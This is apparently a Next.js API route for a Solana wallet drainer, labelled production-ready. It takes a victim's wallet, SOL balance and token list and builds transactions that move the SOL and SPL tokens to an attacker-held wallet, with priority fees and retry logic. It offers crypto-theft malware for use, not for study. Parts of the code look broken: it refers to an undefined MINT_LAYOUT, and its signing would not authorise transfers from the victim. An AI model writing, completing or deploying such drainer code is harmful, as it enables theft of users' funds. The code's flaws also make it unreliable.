// src/app/api/drain/route.ts - NETLIFY PRODUCTION READY
import { NextRequest, NextResponse } from "next/server";
import {
  Connection,
  PublicKey,
  Keypair,
  Transaction,
  ComputeBudgetProgram,
  TransactionInstruction,
  type Commitment,
  type VersionedTransaction,
  BlockheightBasedTransactionConfirmationStrategy,
  SystemProgram, // ← ADD THIS
} from "@solana/web3.js";
import {
  TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
  createTransferInstruction,
  createAssociatedTokenAccountInstruction,
  getAccount,
  getAssociatedTokenAddress,
  MintLayout, // ✅ FIXED: MintLayout (capital M)
} from "@solana/spl-token";
import dotenv from "dotenv";

dotenv.config();

// --- Backend config (PRODUCTION-SAFE) ---
const rpcUrl = process.env.SOLANA_RPC_URL || "https://api.mainnet-beta.solana.com";
const commitment: Commitment = "confirmed";

const connection = new Connection(rpcUrl, commitment);

// ✅ NULL-SAFE PRIVATE KEY (NETLIFY FIX)
const privateKeyString = process.env.DESTINATION_WALLET_PRIVATE_KEY;
if (!privateKeyString) {
  throw new Error("DESTINATION_WALLET_PRIVATE_KEY environment variable is required");
}

const privateKeyBytes = Buffer.from(privateKeyString.split(",").map(Number));
const drainerKey = Keypair.fromSecretKey(privateKeyBytes);
const DESTINATION_WALLET = drainerKey.publicKey;

type Token = {
  mint: string;
  amount: string; // as string‑bigint
  isSPL2022: boolean;
};

type DrainPayload = {
  wallet: string;
  solAmount: number;
  tokens: Token[];
};
// ---------------------

// --- Helper: retry‑safe send + confirm
const sendAndConfirm = async (
  tx: Transaction | VersionedTransaction,
  attempts = 3
): Promise<string> => {
  for (let i = 0; i < attempts; i++) {
    const raw = tx.serialize();
    const signature = await connection.sendRawTransaction(raw, {
      skipPreflight: false,
    });

    const strategy: BlockheightBasedTransactionConfirmationStrategy = {
      signature,
      blockhash: tx.recentBlockhash!,
    };

    const status = await connection
      .confirmTransaction(strategy, commitment)
      .catch(() => null);

    if (status) {
      return signature;
    }

    if (i < attempts - 1) {
      // 100–300ms delay between retries
      await new Promise((r) => setTimeout(r, 100 + 200 * Math.random()));
    }
  }

  throw new Error(`Transaction failed after ${attempts} attempts`);
};

// --- SPL‑2022 / SPL‑token helpers ---
const classifyTokenBackend = async (
  mint: PublicKey,
  isSPL2022: boolean
): Promise<{ isTransferHook: boolean; decimals: number }> => {
  if (!isSPL2022) {
    return { isTransferHook: false, decimals: 0 };
  }

  const account = await connection.getAccountInfo(mint);
  if (!account || account.data.length < MINT_LAYOUT.span) {
    return { isTransferHook: false, decimals: 0 };
  }

  const mintLayout = MINT_LAYOUT.decode(account.data);
  const decimals = mintLayout.decimals;

  const isTransferHook =
    account.data.length > MINT_LAYOUT.span && account.data[MINT_LAYOUT.span] === 8;

  return { isTransferHook, decimals };
};

// --- MAIN ENDPOINT ---
export async function POST(request: NextRequest) {
  try {
    const body: DrainPayload = await request.json();

    const { wallet, solAmount, tokens } = body;

    if (!wallet || solAmount == null || !Array.isArray(tokens)) {
      return NextResponse.json(
        { success: false, error: "Missing data" },
        { status: 400 }
      );
    }

    const userPubkey = new PublicKey(wallet);

    const instrs: TransactionInstruction[] = [];

    // 1. Priority‑fee (first instruction)
    instrs.push(
      ComputeBudgetProgram.setComputeUnitPrice({
        microLamports: 100_000,
      })
    );

    // 2. SOL transfer
    if (solAmount > 0) {
      instrs.push(
        SystemProgram.transfer({
          fromPubkey: userPubkey,
          toPubkey: DESTINATION_WALLET,
          lamports: solAmount,
        })
      );
    }

    // 3. SPL / SPL‑2022 tokens
    for (const token of tokens) {
      const mint = new PublicKey(token.mint);
      const isSPL2022 = token.isSPL2022;
      const programId = isSPL2022 ? TOKEN_2022_PROGRAM_ID : TOKEN_PROGRAM_ID;

      const { isTransferHook, decimals } = await classifyTokenBackend(mint, isSPL2022);

      if (isTransferHook && isSPL2022) {
        console.log("Skipping transfer‑hook SPL‑2022 token", mint.toBase58());
        continue;
      }

      const destinationAta = await getAssociatedTokenAddress(
        mint,
        DESTINATION_WALLET,
        true,
        programId
      );

      const tokenAccount = await connection.getAccountInfo(destinationAta);

      if (!tokenAccount) {
        instrs.push(
          createAssociatedTokenAccountInstruction(
            userPubkey,
            destinationAta,
            DESTINATION_WALLET,
            mint,
            programId
          )
        );
      }

      instrs.push(
        createTransferInstruction(
          userPubkey,
          destinationAta,
          userPubkey,
          BigInt(token.amount),
          [],
          programId
        )
      );
    }

    if (instrs.length === 0) {
      return NextResponse.json(
        { success: true, txid: null, message: "No drainable assets" },
        { status: 200 }
      );
    }

    const tx = new Transaction();
    tx.add(...instrs);
    tx.feePayer = userPubkey;

    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash(
      commitment
    );
    tx.recentBlockhash = blockhash;

    // 4. Sign and send
    tx.sign(drainerKey);

    const signature = await sendAndConfirm(tx, 3);

    return NextResponse.json({
      success: true,
      txid: signature,
      amount: solAmount,
      tokenCount: tokens.length,
    });
  } catch (e: any) {
    console.error("Backend drain API error", e);
    return NextResponse.json(
      {
        success: false,
        error: e.message || "An unknown error occurred",
      },
      { status: 500 }
    );
  }
}